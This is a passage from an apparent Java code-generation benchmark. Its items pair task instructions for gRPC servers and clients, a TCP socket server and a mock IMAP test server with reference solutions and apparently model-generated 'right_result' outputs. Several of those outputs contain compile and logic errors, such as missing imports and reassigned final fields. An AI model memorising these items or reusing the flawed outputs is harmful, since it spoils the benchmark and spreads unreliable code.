GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(message);\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.TimeUnit;\nimport com.example.grpc.WalletGrpc;\nimport com.example.grpc.WalletSolidityGrpc;\nimport com.example.grpc.GrpcAPI;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forAddress(fullnode).usePlaintext().build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n\n        channelSolidity = ManagedChannelBuilder.forAddress(solidityNode).usePlaintext().build();\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n\n        channelpBFT = ManagedChannelBuilder.forAddress(pBFTNode).usePlaintext().build();\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) {\n        GrpcAPI.BlockNum blockNumMsg = GrpcAPI.BlockNum.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(blockNumMsg);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) {\n        GrpcAPI.BlockNum blockNumMsg = GrpcAPI.BlockNum.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(blockNumMsg);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) {\n        GrpcAPI.BlockNum blockNumMsg = GrpcAPI.BlockNum.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(blockNumMsg);\n    }\n\n    public void shutdown() {\n        channelFull.shutdown();\n        channelSolidity.shutdown();\n        channelpBFT.shutdown();\n        try {\n            if (!channelFull.awaitTermination(5, TimeUnit.SECONDS)) {\n                channelFull.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}"
  },
  {
    "Task_id": 508,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens for incoming requests and provides book-related services. The server should start on a specified port, handle graceful shutdown, and wait for termination.\n\nClass Description: The BookServer class represents a gRPC server implementation that hosts book-related services. It manages server lifecycle including startup, shutdown, and termination waiting.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the default port (50051) and registers the BookService. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running.\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated.\n- main(String[] args) -> [void] - Entry point that creates and starts the server, then waits for shutdown. Throws IOException and InterruptedException.\n\nThe class follows gRPC server best practices including:\n1. Using ServerBuilder to create and configure the server\n2. Adding services before starting\n3. Implementing graceful shutdown\n4. Proper error handling\n5. Logging server status",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class BookServer {\n  private static final Logger logger = Logger.getLogger(BookServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new BookService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  BookServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final BookServer server = new BookServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.util.logging.Logger;\nimport java.util.concurrent.TimeUnit;\n\npublic class BookServer {\n    private final Server server;\n    private final Logger logger;\n\n    public BookServer() {\n        this.server = ServerBuilder.forPort(50051).build();\n        this.logger = Logger.getLogger(BookServer.class.getName());\n    }\n\n    public void start() throws IOException {\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            try {\n                stop();\n            } catch (Exception e) {\n                logger.severe(\"Shutdown hook failed: \" + e.getMessage());\n            }\n        }));\n\n        server.start();\n        server.addService(new BookService());\n        logger.info(\"Server started on port 50051\");\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.shutdown();\n            try {\n                if (!server.awaitTermination(30, TimeUnit.SECONDS)) {\n                    server.shutdownNow();\n                }\n            } catch (InterruptedException e) {\n                server.shutdownNow();\n            }\n        }\n    }\n\n    public void blockUntilShutdown() {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        BookServer server = new BookServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n}"
  },
  {
    "Task_id": 509,
    "Instruction": "Task Description: Create a gRPC server in Java that handles incoming requests with configurable delays and traces request contexts using Brave propagation. The server should intercept calls to collect headers and propagation data, and allow for graceful shutdown.\n\nClass Description: TestServer is a gRPC server implementation that intercepts incoming calls to collect tracing information and headers. It supports configurable response delays and maintains queues for request processing.\n\nAttributes:\n- delayQueue: BlockingQueue<Long> - Queue for storing artificial delay durations (milliseconds) to be applied to requests\n- headers: BlockingQueue<Metadata> - Queue for storing metadata headers from incoming requests\n- requests: BlockingQueue<TraceContextOrSamplingFlags> - Queue for storing extracted trace contexts from requests\n- extractor: Extractor<GrpcServerRequest> - Brave propagation extractor for trace context extraction\n- server: Server - The gRPC server instance\n\nMethods:\n- TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) -> void - Constructor that initializes the server with propagation configuration\n- start() -> void - Starts the gRPC server\n- stop() -> void - Stops the server gracefully and awaits termination\n- port() -> int - Returns the port number the server is listening on\n- takeRequest() -> TraceContextOrSamplingFlags - Retrieves the next request context from the queue (waits up to 3 seconds)\n- enqueueDelay(long millis) -> void - Adds a delay duration to be applied to the next request",
    "Canonical_solution": "import brave.propagation.Propagation;\nimport brave.propagation.TraceContext.Extractor;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport io.grpc.Metadata;\nimport io.grpc.Metadata.Key;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerCall;\nimport io.grpc.ServerCall.Listener;\nimport io.grpc.ServerCallHandler;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerInterceptors;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\nclass TestServer {\n  static final Key<String> CUSTOM_KEY = Key.of(\"custom\", Metadata.ASCII_STRING_MARSHALLER);\n  final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n  final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n  final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n  final Extractor<GrpcServerRequest> extractor;\n  final Server server;\n\n  TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n    extractor = propagation.extractor(GrpcServerRequest::propagationField);\n    server = ServerBuilder.forPort(PickUnusedPort.get())\n        .addService(ServerInterceptors.intercept(\n            new GreeterImpl(null),\n            new ServerInterceptor() {\n              @Override\n              public <ReqT, RespT> Listener<ReqT> interceptCall(ServerCall<ReqT, RespT> call,\n                  Metadata headers, ServerCallHandler<ReqT, RespT> next) {\n                Long delay = delayQueue.poll();\n                if (delay != null) {\n                  try {\n                    Thread.sleep(delay);\n                  } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    throw new AssertionError(\"interrupted sleeping \" + delay);\n                  }\n                }\n                TestServer.this.headers.add(headers);\n                requests.add(extractor.extract(new GrpcServerRequest(nameToKey, call, headers)));\n                return next.startCall(new SimpleForwardingServerCall<ReqT, RespT>(call) {\n                  @Override public void sendHeaders(Metadata headers) {\n                    headers.put(CUSTOM_KEY, \"brave\");\n                    super.sendHeaders(headers);\n                  }\n                }, headers);\n              }\n            }))\n        .build();\n  }\n\n  void start() throws IOException {\n    server.start();\n  }\n\n  void stop() {\n    server.shutdown();\n    try {\n      server.awaitTermination();\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  int port() {\n    return server.getPort();\n  }\n\n  TraceContextOrSamplingFlags takeRequest() {\n    try {\n      return requests.poll(3, TimeUnit.SECONDS);\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  void enqueueDelay(long millis) {\n    this.delayQueue.add(millis);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerCall;\nimport io.grpc.ServerCallHandler;\nimport io.grpc.Metadata;\nimport brave.propagation.Propagation;\nimport brave.propagation.TraceContext;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport brave.propagation.Extractor;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.Map;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestServer {\n    private final Server server;\n    private final int port;\n    private final BlockingQueue<Long> delayQueue;\n    private final BlockingQueue<Metadata> headers;\n    private final BlockingQueue<TraceContextOrSamplingFlags> requests;\n    private final Extractor<GrpcServerRequest> extractor;\n\n    public TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n        this.port = 50051;\n        this.delayQueue = new LinkedBlockingQueue<>();\n        this.headers = new LinkedBlockingQueue<>();\n        this.requests = new LinkedBlockingQueue<>();\n        this.extractor = new BravePropagationExtractor(propagation);\n        server = ServerBuilder.forPort(port)\n                .addService(new TestServiceImpl())\n                .intercept(new RequestInterceptor(extractor, requests, headers, delayQueue))\n                .build();\n    }\n\n    public void start() {\n        server.start();\n    }\n\n    public void stop() {\n        server.shutdownNow();\n        try {\n            server.awaitTermination(5, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public int port() {\n        return port;\n    }\n\n    public TraceContextOrSamplingFlags takeRequest() {\n        try {\n            return requests.poll(3, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            return null;\n        }\n    }\n\n    public void enqueueDelay(long millis) {\n        delayQueue.add(millis);\n    }\n\n    private static class RequestInterceptor implements ServerInterceptor {\n        private final Extractor<GrpcServerRequest> extractor;\n        private final BlockingQueue<TraceContextOrSamplingFlags> requests;\n        private final BlockingQueue<Metadata> headers;\n        private final BlockingQueue<Long> delayQueue;\n\n        public RequestInterceptor(Extractor<GrpcServerRequest> extractor, BlockingQueue<TraceContextOrSamplingFlags> requests, BlockingQueue<Metadata> headers, BlockingQueue<Long> delayQueue) {\n            this.extractor = extractor;\n            this.requests = requests;\n            this.headers = headers;\n            this.delayQueue = delayQueue;\n        }\n\n        @Override\n        public <ReqT, RespT> ServerCall<ReqT, RespT> interceptCall(ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {\n            TraceContextOrSamplingFlags context = extractor.extract(call);\n            requests.add(context);\n            this.headers.add(headers);\n            \n            Long delay = delayQueue.poll();\n            if (delay != null) {\n                try {\n                    Thread.sleep(delay);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n            \n            return next.startCall(call, headers);\n        }\n    }\n\n    private static class TestServiceImpl implements TestServiceGrpc.TestServiceBlockingStub {\n        // Dummy service implementation\n    }\n}"
  },
  {
    "Task_id": 512,
    "Instruction": "Task Description: Create a Java class that implements a gRPC server for a simple \"Hello World\" service, following the gRPC framework conventions. The server should handle incoming requests, process them, and send back appropriate responses, while also managing server lifecycle operations.\n\nClass Description: The HelloWorldServer class is a gRPC server implementation that listens on a specified port, handles incoming gRPC requests for a greeting service, and manages server startup and shutdown operations. It includes an inner class that implements the actual gRPC service logic.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on a predefined port (50051) and registers the Greeter service implementation. Also adds a shutdown hook for graceful termination.\n- stop() -> [void] - Stops the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the main thread until the server is terminated\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance\n- GreeterImpl.sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) -> [void] - Implementation of the gRPC service method that processes HelloRequest and sends HelloReply",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.examples.helloworld.GreeterGrpc;\nimport io.grpc.examples.helloworld.HelloReply;\nimport io.grpc.examples.helloworld.HelloRequest;\nimport io.grpc.stub.StreamObserver;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class HelloWorldServer {\n  private static final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50051;\n    server = ServerBuilder.forPort(port).addService(new GreeterImpl()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread() {\n              @Override\n              public void run() {\n                System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                HelloWorldServer.this.stop();\n                System.err.println(\"*** server shut down\");\n              }\n            });\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final HelloWorldServer server = new HelloWorldServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n\n  static class GreeterImpl extends GreeterGrpc.GreeterImplBase {\n    @Override\n    public void sayHello(HelloRequest req, StreamObserver<HelloReply> responseObserver) {\n      HelloReply reply = HelloReply.newBuilder().setMessage(\"Hello \" + req.getName()).build();\n      responseObserver.onNext(reply);\n      responseObserver.onCompleted();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.util.logging.Logger;\nimport java.util.concurrent.TimeUnit;\n\npublic class HelloWorldServer {\n    private final Server server;\n    private final Logger logger = Logger.getLogger(HelloWorldServer.class.getName());\n\n    private static final int PORT = 50051;\n\n    public HelloWorldServer() {\n        server = ServerBuilder.forPort(PORT)\n                .addService(new GreeterImpl())\n                .build();\n    }\n\n    public void start() {\n        logger.info(\"Starting server on \" + PORT);\n        server.start();\n\n        // Add shutdown hook\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            logger.info(\"Shutting down server...\");\n            if (server != null) {\n                server.shutdown();\n                try {\n                    if (server.awaitTermination(30, TimeUnit.SECONDS)) {\n                        logger.info(\"Server shutdown completed.\");\n                    } else {\n                        logger.warning(\"Server shutdown did not complete in time.\");\n                    }\n                } catch (InterruptedException e) {\n                    logger.severe(\"Server shutdown interrupted: \" + e.getMessage());\n                }\n            }\n        }));\n    }\n\n    public void stop() {\n        if (server != null) {\n            logger.info(\"Stopping server...\");\n            server.shutdown();\n        }\n    }\n\n    public void blockUntilShutdown() {\n        if (server != null) {\n            logger.info(\"Blocking until server shutdown...\");\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) {\n        HelloWorldServer server = new HelloWorldServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    private static class GreeterImpl extends io.grpc.example.helloworld.GreeterGrpc.GreeterImplBase {\n        @Override\n        public void sayHello(io.grpc.example.helloworld.HelloRequest request,\n                             io.grpc.stub.StreamObserver<io.grpc.example.helloworld.HelloReply> responseObserver) {\n            String name = request.getName();\n            io.grpc.example.helloworld.HelloReply reply = io.grpc.example.helloworld.HelloReply.newBuilder()\n                    .setMessage(\"Hello \" + name).build();\n            responseObserver.onNext(reply);\n            responseObserver.onCompleted();\n        }\n    }\n}"
  },
  {
    "Task_id": 514,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens on a specified port, provides a service, and handles graceful shutdown.\n\nClass Description: The ShelfServer class is responsible for creating and managing a gRPC server instance. It initializes the server on a specified port, adds the required service implementation, and provides methods for starting, stopping, and waiting for server termination.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50052 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance. Throws IOException and InterruptedException for server start and shutdown operations",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n  private static final Logger logger = Logger.getLogger(ShelfServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50052;\n    server = ServerBuilder.forPort(port).addService(new ShelfService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  ShelfServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final ShelfServer server = new ShelfServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "right_result": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n    private final Logger logger;\n    private Server server;\n    private final int port;\n\n    public ShelfServer(int port) {\n        this.port = port;\n        this.logger = Logger.getLogger(ShelfServer.class.getName());\n    }\n\n    public void start() throws IOException {\n        server = ServerBuilder.forPort(port)\n                .addService(new MyService())\n                .build()\n                .start();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            server.shutdownNow();\n        }));\n\n        logger.info(\"Server started on port \" + port);\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.shutdown();\n        }\n    }\n\n    public void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        int port = 50052;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        ShelfServer server = new ShelfServer(port);\n        server.start();\n        server.blockUntilShutdown();\n    }\n\n    static class MyService extends MyServiceGrpc.MyServiceImplBase {\n        @Override\n        public void someMethod(ManagedChannel channel, StreamObserver<SomeResponse> responseObserver) {\n            responseObserver.onNext(SomeResponse.newBuilder().build());\n            responseObserver.onCompleted();\n        }\n    }\n}"
  },
  {
    "Task_id": 515,
    "Instruction": "Task Description: Create a Java class that implements a basic TCP server using ServerSocket to handle client connections and communication.\n\nClass Description: The SocketServer class establishes a TCP server that listens for incoming client connections on a specified port, handles communication with connected clients, and properly closes connections when done.\n\nAttributes:\n- serverSocket: [ServerSocket] - The server socket that listens for incoming client connections\n- clientSocket: [Socket] - The socket representing the connected client\n\nMethods:\n- start([int port]) -> [void] - Starts the server on the specified port, waits for client connections, and initiates communication handling\n- handleClientCommunication() -> [void] - Handles the data exchange with the connected client (receives data and sends response)\n- closeConnections() -> [void] - Closes both client and server sockets to release resources",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketServer {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n\n    public void start(int port) throws Exception {\n        serverSocket = new ServerSocket(port);\n        System.out.println(\"Server started, waiting for connections...\");\n        \n        clientSocket = serverSocket.accept();\n        System.out.println(\"Client connected\");\n        \n        handleClientCommunication();\n    }\n\n    private void handleClientCommunication() throws Exception {\n        try {\n            // Read from client\n            byte[] buffer = new byte[1024];\n            int len;\n            StringBuilder sb = new StringBuilder();\n            clientSocket.setSoTimeout(2000);\n            \n            while ((len = clientSocket.getInputStream().read(buffer)) != -1) {\n                sb.append(new String(buffer, 0, len));\n            }\n            System.out.println(\"From client: \" + sb);\n\n            // Write to client\n            String response = \"Hi I'm server\\r\\n\";\n            clientSocket.getOutputStream().write(response.getBytes());\n        } finally {\n            closeConnections();\n        }\n    }\n\n    private void closeConnections() throws Exception {\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        System.out.println(\"Connections closed\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.net.ServerSocket; import java.net.Socket; import java.io.BufferedReader; import java.io.InputStreamReader; import java.io.PrintWriter; import java.io.IOException; public class SocketServer { private ServerSocket serverSocket; private Socket clientSocket; public void start(int port) { try { serverSocket = new ServerSocket(port); clientSocket = serverSocket.accept(); handleClientCommunication(); } catch (IOException e) { e.printStackTrace(); } finally { closeConnections(); } } public void handleClientCommunication() { try { BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream())); PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true); String inputLine; while ((inputLine = in.readLine()) != null) { System.out.println(\"Received: \" + inputLine); out.println(\"Echo: \" + inputLine); } } catch (IOException e) { e.printStackTrace(); } finally { try { clientSocket.close(); } catch (IOException e) { e.printStackTrace(); } } } public void closeConnections() { try { if (serverSocket != null) serverSocket.close(); if (clientSocket != null) clientSocket.close(); } catch (IOException e) { e.printStackTrace(); } } }"
  },
  {
    "Task_id": 519,
    "Instruction": "Task Description: Create a mock IMAP server implementation in Java that simulates IMAP server behavior for testing purposes, handling client connections and interactions through TCP sockets.\n\nClass Description: MockImapServer is a test utility class that simulates an IMAP server by listening on a local port, accepting client connections, and processing predefined interactions. It manages server lifecycle and provides synchronization mechanisms for test coordination.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of predefined IMAP interactions to simulate\n- waitForConnectionClosed: CountDownLatch - Synchronization primitive for waiting until client connection closes\n- waitForAllExpectedCommands: CountDownLatch - Synchronization primitive for waiting until all expected commands are processed\n- mockServerThread: MockServerThread - The thread running the server operations\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread. Binds to an available port on localhost.\n- shutdown() -> void - Stops the server thread and cleans up resources, with a 500ms timeout for graceful shutdown.\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread implementation\n- run() -> void - Main server thread logic that accepts connections, processes interactions, and handles cleanup\n- handleInteractions() -> void - Processes the next interaction from the queue (internal method)\n- readAdditionalCommands() -> void - Reads additional unexpected commands from client (internal method)\n- shouldStop() -> void - Signals the server thread to stop and closes client socket",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = ((java.net.InetSocketAddress) serverSocket.getLocalSocketAddress()).getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n        try {\n            mockServerThread.join(500L);\n        } catch (InterruptedException ignored) {\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                              CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = new java.io.BufferedReader(\n                    new java.io.InputStreamReader(clientSocket.getInputStream())).readLine();\n            if (command == null) {\n                throw new java.io.EOFException();\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\nimport java.util.*;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final MockServerThread mockServerThread;\n    private final String host;\n    private final int port;\n\n    public MockImapServer(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.interactions = new ConcurrentLinkedDeque<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.mockServerThread = null;\n    }\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(port, 1, InetAddress.getLocalHost());\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                mockServerThread.join(500);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private boolean shouldStop = false;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        public void shouldStop() {\n            this.shouldStop = true;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!shouldStop) {\n                    if (serverSocket == null) {\n                        break;\n                    }\n                    Socket clientSocket = serverSocket.accept();\n                    processClient(clientSocket);\n                }\n            } catch (IOException e) {\n                // Handle exception\n            } finally {\n                try {\n                    if (serverSocket != null) {\n                        serverSocket.close();\n                    }\n                } catch (IOException e) {\n                    // Handle\n                }\n            }\n        }\n\n        private void processClient(Socket clientSocket) {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n                while (true) {\n                    handleInteractions(in, 